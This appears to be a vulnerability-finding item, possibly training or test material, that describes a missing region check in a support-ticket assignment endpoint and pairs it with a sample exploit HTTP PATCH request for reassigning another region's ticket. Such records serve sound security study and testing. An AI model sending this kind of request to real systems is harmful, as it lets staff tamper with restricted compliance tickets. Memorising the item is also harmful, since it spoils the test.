diagnosis: The staff router verifies that the caller is an active support agent, but allows reassigning tickets across international jurisdictions without ensuring ticket.region_code == agent.region_code. Support staff in one jurisdiction can tamper with sensitive regulatory and compliance tickets restricted to other regions.
exploit_request:
PATCH /staff/support/tickets/8819/assign HTTP/1.1
Host: api.example.com
Authorization: Bearer <us_support_agent_token>
Content-Type: application/json

{"target_agent_id": "agent_us_102"}
